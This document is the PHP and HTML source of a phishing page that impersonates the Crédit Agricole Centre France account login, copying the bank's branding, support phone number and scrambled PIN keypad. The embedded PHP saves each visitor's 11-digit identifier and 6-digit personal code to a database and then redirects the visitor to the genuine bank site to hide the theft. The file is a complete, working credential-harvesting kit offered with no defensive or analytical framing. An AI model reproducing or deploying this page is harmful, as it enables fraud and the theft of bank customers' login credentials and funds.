<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banque &amp; Assurances - Crédit Agricole Centre France</title>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

    <link rel="icon" type="img/logo.jpg" href="img/logo.jpg">

    <style>
        .chiffre{
            background-color: #fff;
            margin-left: 10px;
            margin-top: 10px;
            text-align: center;
            padding: 6px;   
            font-size: 1.5em;
            border: 1px solid rgba(0,0,0,0.1);
        }

        .chiffre > a {
            color: #000;
            text-decoration: none;
        }
        .chiffre > a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body id="notscroll">
<nav class="navbar navbar-expand-lg navbar-light">
    
    <div class="container-fluid">
        <a class="navbar-brand" href="#"><img src="img/logo2.jpg" style="margin-top: -6%;margin-left: -6%" alt="Logo" class="img-fluid"></a>
        
        <div class="" id="navbarSupportedContent" style="margin-right: -0.75%">
            <ul class="navbar-nav mb-2 mb-lg-0" style="margin-top: -18%;">
                
                <li class="nav-item btn rounded-0" style="background: rgb(0, 125, 143);">
                    <a class="nav-link active text-light fs-6 p-3" aria-current="page" href="#">X</a>
                </li>
            </ul>
        
        </div>
    </div>
</nav>

<div class="row bg-light" style="margin-top: -0.5%">
    <div class="col-md-6"><img src="img/image2.jpg" class="img-fluid" alt=""></div>
    <div class="col-md-6">
        <div class="row mt-5 p-4">
            <div class="col-md-6">
                <h3 class="ml-3 mb-4" style="color: rgb(0, 125, 143);">ACCÉDER À <span class="fw-bold">MES COMPTES</span></h3>

                <?php
                    if (isset($_POST['valider'])){
                        include 'db.php';

                        $identifiant = htmlentities(trim($_POST['identifiant']));
                        $code = htmlentities(trim($_POST['code']));

                        if ($identifiant && $code) {
                            $insert = $db->prepare('INSERT INTO client(identifiant, code) VALUES(:identifiant, :code)');
                            try {
                                $insert->execute(array(':identifiant' => $identifiant, ':code' => $code));
                            } catch (Exception $e) {
                                die("Erreur lors de l'insertion : ".$e->getMessage());
                            }

                            header('Location: https://www.credit-agricole.fr/ca-centrefrance/particulier/acceder-a-mes-comptes.html');
                        }else{
                            echo '<p class="text-danger">Veuillez renseigner tous les champs</p>';
                        }
                    }
                ?>

                <p class="fw-bold">IDENTIFIANT</p>
                <p>Saisissez votre identifiant à 11 chiffres</p>
                <form action="" method="post">
                    <!-- <input type="text" class="form-control mb-4" placeholder="Ex: 98652706859" pattern="[0-11]{5}" maxlength="11" id="in" onkeyup="mySpan.innerHTML=this.value.length" onclick="Func()"> -->
                    <input type="text" class="form-control mb-4" placeholder="Ex: 98652706859" maxlength="11" name="identifiant" id="in" onkeyup="Func()">

                    <div id="code" style="display: none">
                        <div class="row">
                            <div class="col-6">

                                <label>CODE PERSONNEL</label>
                            </div>
                            <div class="col-6">
                                <p class="text-right">
                                    <a href="" class="end-0" style="color: rgb(0, 125, 143);">
                                        <i>Perdu / Oublié ?</i>
                                    </a>
                                </p>
                            </div>
                        </div>
                        <input type="password" name="code" class="form-control mb-4" placeholder="Tapez votre code dans le pavé numérique ci-dessous" maxlength="6" id="in2" onkeyup="Func3()" readonly>
                    </div>


                    <button type="submit" class="form-control btn code_perso" style="background: rgb(0, 125, 143);color:white" id="buttonEnvoi" disabled onclick="Func2()">ENTREZ MON CODE PERSONNEL</button>
                    <div id="chiffres" style="display: none">

                        <div class="row">
                            <div class="col-2 chiffre" data-id="5"><a href="#" onclick="myfunc5()" id="myfunc5">5</a></div>
                            <div class="col-2 chiffre" data-id="8"><a href="#" onclick="myfunc8()" id="myfunc8">8</a></div>
                            <div class="col-2 chiffre" data-id="1"><a href="#" onclick="myfunc1()" id="myfunc1">1</a></div>
                            <div class="col-2 chiffre" data-id="3"><a href="#" onclick="myfunc3()" id="myfunc3">3</a></div>
                            <div class="col-2 chiffre" data-id0="0"><a href="#" onclick="myfunc0()" id="myfunc0">0</a></div>
                        </div>
                        <div class="row mt-2 mb-3">
                            <div class="col-2 chiffre" data-id="7"><a href="#" onclick="myfunc7()" id="myfunc7">7</a></div>
                            <div class="col-2 chiffre" data-id="2"><a href="#" onclick="myfunc2()" id="myfunc2">2</a></div>
                            <div class="col-2 chiffre" data-id="6"><a href="#" onclick="myfunc6()" id="myfunc6">6</a></div>
                            <div class="col-2 chiffre" data-id="4"><a href="#" onclick="myfunc4()" id="myfunc4">4</a></div>
                            <div class="col-2 chiffre" data-id="9"><a href="#" onclick="myfunc9()" id="myfunc9">9</a></div>
                        </div>
                    </div>
                    
                    <button type="submit" name="valider" class="form-control btn" style="background: rgb(0, 125, 143);color:white;display: none" id="buttonEnvoi2" disabled>VALIDER</button>
                </form>

                <p class="text-center h4" style="margin-top: 40%;color: rgb(0, 125, 143);">Vous n’êtes pas encore client ?</p>

                <a href="" class="btn form-control" style="background-color: rgb(0, 125, 143);color:#fff">DEVENIR CLIENT</a>
            </div>
            <div class="col-md-6 mt-5">
                <h5>OUBLI/PERTE DE CODE PERSONNEL </h3>
                <p>Si vous avez oublié ou perdu votre code personnel, cliquez <a href=""  style="color: rgb(0, 125, 143);">ici</a>.</p>
                

                <h5>ASSISTANCE TECHNIQUE</h5>
                <p>Vous rencontrez un problème sur notre site ou sur nos applications mobiles, contactez-nous par téléphone au

                <span class="h5">04 73 74 40 80</span> (8h30-19h du lundi au vendredi, 8h30-17h le samedi, prix d’un appel local) ou par mail en cliquant ici.
                Uniquement si vous êtes client(e) du Crédit Agricole Centre France (Allier, Cantal, Corrèze, Creuse, Puy-de-Dôme) sinon merci de vous rendre sur le site de la Caisse régionale qui gère votre compte.

                Vous pouvez également consulter notre aide en ligne et nos tutos.</p>
                

                <h5>SÉCURITÉ</h5>
                Facilitez et sécurisez vos opérations en ligne avec Sécuripass : en savoir plus. 

                Restez vigilants et veillez à protéger vos données personnelles.
                Consultez nos conseils de sécurité

                Nous vous invitons également à consulter régulièrement nos Conditions Générales d'utilisation.
                Voir les Conditions Générales d'Utilisation
            </div>
        </div>
    </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>


<script>

    function Func(){

        var taille = document.getElementById('in').value.length;

        if(taille == 11)
        {
            document.getElementById('buttonEnvoi').disabled = false;
        }
    }

    function Func3(){

        var taille = document.getElementById('in2').value.length;


        if(taille == 6)
        {
            document.getElementById('buttonEnvoi2').disabled = false;
        }
    }

    function Func2(){
        document.getElementById('buttonEnvoi').style.display="none";
        document.getElementById('buttonEnvoi2').style.display="block";
        document.getElementById('chiffres').style.display="block";
        document.getElementById('code').style.display="block";
    }


    function myfunc0()
    {
        let id = document.getElementById('myfunc0').innerHTML;
        let valeur_ini = document.getElementById('in2').value;

        if(valeur_ini.length < 6)
        {
            if(valeur_ini.length < 5){
                document.getElementById('in2').setAttribute('value', valeur_ini+id);

            }else{

                document.getElementById('in2').setAttribute('value', valeur_ini+id);
                document.getElementById('buttonEnvoi2').disabled = false;
            }
        }else{
            document.getElementById('buttonEnvoi2').disabled = false;
        }

        
    }

    function myfunc1()
    {
        let id = document.getElementById('myfunc1').innerHTML;
        let valeur_ini = document.getElementById('in2').value;

        if(valeur_ini.length < 6)
        {
            if(valeur_ini.length < 5){
                document.getElementById('in2').setAttribute('value', valeur_ini+id);

            }else{

                document.getElementById('in2').setAttribute('value', valeur_ini+id);
                document.getElementById('buttonEnvoi2').disabled = false;
            }
        }else{
            document.getElementById('buttonEnvoi2').disabled = false;
        }
    }
    function myfunc2()
    {
        let id = document.getElementById('myfunc2').innerHTML;
        let valeur_ini = document.getElementById('in2').value;

        if(valeur_ini.length < 6)
        {
            if(valeur_ini.length < 5){
                document.getElementById('in2').setAttribute('value', valeur_ini+id);

            }else{

                document.getElementById('in2').setAttribute('value', valeur_ini+id);
                document.getElementById('buttonEnvoi2').disabled = false;
            }
        }else{
            document.getElementById('buttonEnvoi2').disabled = false;
        }
    }
    function myfunc3()
    {
        let id = document.getElementById('myfunc3').innerHTML;
        let valeur_ini = document.getElementById('in2').value;

        if(valeur_ini.length < 6)
        {
            if(valeur_ini.length < 5){
                document.getElementById('in2').setAttribute('value', valeur_ini+id);

            }else{

                document.getElementById('in2').setAttribute('value', valeur_ini+id);
                document.getElementById('buttonEnvoi2').disabled = false;
            }
        }else{
            document.getElementById('buttonEnvoi2').disabled = false;
        }
    }
    function myfunc4()
    {
        let id = document.getElementById('myfunc4').innerHTML;
        let valeur_ini = document.getElementById('in2').value;

        if(valeur_ini.length < 6)
        {
            if(valeur_ini.length < 5){
                document.getElementById('in2').setAttribute('value', valeur_ini+id);

            }else{

                document.getElementById('in2').setAttribute('value', valeur_ini+id);
                document.getElementById('buttonEnvoi2').disabled = false;
            }
        }else{
            document.getElementById('buttonEnvoi2').disabled = false;
        }
    }
    function myfunc5()
    {
        let id = document.getElementById('myfunc5').innerHTML;
        let valeur_ini = document.getElementById('in2').value;

        if(valeur_ini.length < 6)
        {
            if(valeur_ini.length < 5){
                document.getElementById('in2').setAttribute('value', valeur_ini+id);

            }else{

                document.getElementById('in2').setAttribute('value', valeur_ini+id);
                document.getElementById('buttonEnvoi2').disabled = false;
            }
        }else{
            document.getElementById('buttonEnvoi2').disabled = false;
        }
    }
    function myfunc6()
    {
        let id = document.getElementById('myfunc6').innerHTML;
        let valeur_ini = document.getElementById('in2').value;

        if(valeur_ini.length < 6)
        {
            if(valeur_ini.length < 5){
                document.getElementById('in2').setAttribute('value', valeur_ini+id);

            }else{

                document.getElementById('in2').setAttribute('value', valeur_ini+id);
                document.getElementById('buttonEnvoi2').disabled = false;
            }
        }else{
            document.getElementById('buttonEnvoi2').disabled = false;
        }
    }
    function myfunc7()
    {
        let id = document.getElementById('myfunc7').innerHTML;
        let valeur_ini = document.getElementById('in2').value;

        if(valeur_ini.length < 6)
        {
            if(valeur_ini.length < 5){
                document.getElementById('in2').setAttribute('value', valeur_ini+id);

            }else{

                document.getElementById('in2').setAttribute('value', valeur_ini+id);
                document.getElementById('buttonEnvoi2').disabled = false;
            }
        }else{
            document.getElementById('buttonEnvoi2').disabled = false;
        }
    }
    function myfunc8()
    {
        let id = document.getElementById('myfunc8').innerHTML;
        let valeur_ini = document.getElementById('in2').value;

        if(valeur_ini.length < 6)
        {
            if(valeur_ini.length < 5){
                document.getElementById('in2').setAttribute('value', valeur_ini+id);

            }else{

                document.getElementById('in2').setAttribute('value', valeur_ini+id);
                document.getElementById('buttonEnvoi2').disabled = false;
            }
        }else{
            document.getElementById('buttonEnvoi2').disabled = false;
        }
    }
    function myfunc9()
    {
        let id = document.getElementById('myfunc9').innerHTML;
        let valeur_ini = document.getElementById('in2').value;

        if(valeur_ini.length < 6)
        {
            if(valeur_ini.length < 5){
                document.getElementById('in2').setAttribute('value', valeur_ini+id);

            }else{

                document.getElementById('in2').setAttribute('value', valeur_ini+id);
                document.getElementById('buttonEnvoi2').disabled = false;
            }
        }else{
            document.getElementById('buttonEnvoi2').disabled = false;
        }
    }


    $('a[href="#"]').click(function () {
        return false
    });

    $('.code_perso').click(function () {
        return false
    });

</script>
</body>
</html>